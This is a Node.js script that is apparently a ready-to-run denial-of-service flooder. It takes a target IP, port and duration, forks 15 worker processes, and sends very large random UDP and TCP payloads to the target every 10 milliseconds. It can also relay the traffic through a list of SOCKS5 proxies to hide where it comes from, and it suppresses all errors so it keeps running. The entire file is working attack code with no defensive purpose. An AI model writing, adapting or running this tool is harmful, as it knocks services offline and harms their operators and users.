const fs = require('fs');
const dgram = require('dgram');
const net = require('net');
const cluster = require('cluster');
const crypto = require('crypto');
const gradient = require("gradient-string")

var ip = process.argv[2];
var port = parseInt(process.argv[3]);
var duration = parseInt(process.argv[4]);
var proxyFile = process.argv[5];
let proxies = [];
if (proxyFile && fs.existsSync(proxyFile)) {
    proxies = fs.readFileSync(proxyFile, 'utf-8').split(/\r?\n/).filter(Boolean);
}

function Socks5Proxy(proxy, targetHost, targetPort, payload) {
  const [proxyHost, proxyPort] = proxy.split(':');
  const socket = new net.Socket();
  socket.connect(parseInt(proxyPort), proxyHost, () => {
    socket.write(Buffer.from([0x05, 0x01, 0x00]));
  });
  socket.on('data', (data) => {
    if (data[0] === 0x05 && data[1] === 0x00 && data.length === 2) {
      const addr = targetHost.split('.').map(octet => parseInt(octet));
      const portBuf = Buffer.alloc(2);
      portBuf.writeUInt16BE(targetPort, 0);
      socket.write(Buffer.concat([
        Buffer.from([0x05, 0x01, 0x00, 0x01]),
        Buffer.from(addr),
        portBuf
      ]));
    } else if (data[0] === 0x05 && data[1] === 0x00) {
      socket.write(payload);
    }
  });
  socket.on('error', () => socket.destroy());
  setTimeout(() => socket.destroy(), 300);
}
if (!ip || !port || !duration) {
  console.log(gradient.atlas("Usage: node udp-xvl <ip> <port> <duration> [proxyFile]"));
  process.exit();
}
const payloadSize = 80 * 1024 * 1024;
if (cluster.isMaster) {
  console.log(`Duar Duar Duar Senpai :> ${ip}:${port} for ${duration}s`);
  for (let i = 0; i < 15; i++) cluster.fork();
  setTimeout(() => process.exit(), duration * 1000);
} else {
  const udp = dgram.createSocket('udp4');
  const payload = crypto.randomBytes(payloadSize);
  if (proxies.length > 0) {
    setInterval(() => {
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      udp.send(payload, 0, payload.length, port, ip, () => {});
      const proxy = proxies[Math.floor(Math.random() * proxies.length)];
      Socks5Proxy(proxy, ip, port, payload);
    }, 10);
    setInterval(() => {
      const socket = new net.Socket();
      socket.connect(port, ip, () => {
        socket.write(payload);
      });
      socket.on('error', () => {});
      setTimeout(() => socket.destroy(), 300);
    }, 10);
  } else {
    setInterval(() => {
      udp.send(payload, 0, payload.length, port, ip, () => {});
    }, 10);
    setInterval(() => {
      const socket = new net.Socket();
      socket.connect(port, ip, () => {
        socket.write(payload);
      });
      socket.on('error', () => {});
      setTimeout(() => socket.destroy(), 300);
    }, 10);
  }
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});